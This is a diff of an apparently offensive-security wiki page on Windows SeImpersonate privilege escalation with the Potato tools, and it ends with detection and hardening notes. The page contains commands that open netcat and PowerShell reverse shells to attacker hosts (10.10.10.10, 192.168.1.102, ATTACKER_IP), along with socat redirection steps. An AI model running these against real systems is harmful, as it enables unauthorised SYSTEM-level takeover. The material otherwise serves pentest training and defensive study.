@@ -1,8 +1,7 @@
 # RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato
 
-
 > [!WARNING]
-> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [[https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato|**PrintSpoofer**]]** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [[https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/|blog post]] goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.
+> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.
 
 > [!TIP]
 > A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.
@@ -27,7 +26,7 @@ Check privileges quickly:
 ```cmd
 whoami /priv | findstr /i impersonate
 ```
-```
+
 Operational notes:
 
 - PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
@@ -53,7 +52,7 @@ c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"
 NULL
 
 ```
-```
+
 Notes:
 - You can use -i to spawn an interactive process in the current console, or -c to run a one-liner.
 - Requires Spooler service. If disabled, this will fail.
@@ -65,7 +64,7 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l
 # In some old versions you need to use the "-f" param
 c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 ```
-```
+
 If outbound 135 is blocked, pivot the OXID resolver via socat on your redirector:
 
 ```bash
@@ -75,7 +74,7 @@ socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
 # On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
 RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
 ```
-```
+
 ### SharpEfsPotato
 
 ```bash
@@ -96,7 +95,7 @@ df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
 C:\temp>type C:\temp\w.log
 nt authority\system
 ```
-```
+
 ### EfsPotato
 
 ```bash
@@ -115,14 +114,14 @@ CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes su
 
 nt authority\system
 ```
-```
+
 Tip: If one pipe fails or EDR blocks it, try the other supported pipes:
 
 ```text
 EfsPotato <cmd> [pipe]
   pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
 ```
-```
+
 ### GodPotato
 
 ```bash
@@ -130,13 +129,13 @@ EfsPotato <cmd> [pipe]
 # You can achieve a reverse shell like this.
 > GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
-```
+
 Notes:
 - Works across Windows 8/8.1–11 and Server 2012–2022 when SeImpersonatePrivilege is present.
 
 ### DCOMPotato
 
-![[https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa|image]]
+![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
 
 DCOMPotato provides two variants targeting service DCOM objects that default to RPC_C_IMP_LEVEL_IMPERSONATE. Build or use the provided binaries and run your command:
 
@@ -147,7 +146,7 @@ PrinterNotifyPotato.exe "cmd /c whoami"
 # McpManagementService variant (Server 2022 also)
 McpManagementPotato.exe "cmd /c whoami"
 ```
-```
+
 ### SigmaPotato (updated GodPotato fork)
 
 SigmaPotato adds modern niceties like in-memory execution via .NET reflection and a PowerShell reverse shell helper.
@@ -160,7 +159,7 @@ SigmaPotato adds modern niceties like in-memory execution via .NET reflection an
 # Or ask it to spawn a PS reverse shell
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
-```
+
 ## Detection and hardening notes
 
 - Monitor for processes creating named pipes and immediately calling token-duplication APIs followed by CreateProcessAsUser/CreateProcessWithTokenW. Sysmon can surface useful telemetry: Event ID 1 (process creation), 17/18 (named pipe created/connected), and command lines spawning child processes as SYSTEM.
@@ -171,13 +170,13 @@ SigmaPotato adds modern niceties like in-memory execution via .NET reflection an
 
 ## References
 
-- [[https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/|https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/]]
-- [[https://github.com/itm4n/PrintSpoofer|https://github.com/itm4n/PrintSpoofer]]
-- [[https://github.com/antonioCoco/RoguePotato|https://github.com/antonioCoco/RoguePotato]]
-- [[https://github.com/bugch3ck/SharpEfsPotato|https://github.com/bugch3ck/SharpEfsPotato]]
-- [[https://github.com/BeichenDream/GodPotato|https://github.com/BeichenDream/GodPotato]]
-- [[https://github.com/zcgonvh/EfsPotato|https://github.com/zcgonvh/EfsPotato]]
-- [[https://github.com/zcgonvh/DCOMPotato|https://github.com/zcgonvh/DCOMPotato]]
-- [[https://github.com/tylerdotrar/SigmaPotato|https://github.com/tylerdotrar/SigmaPotato]]
-- [[https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/|https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/]]
+- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
+- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
+- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
+- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
+- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
+- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
+- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
+- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
 
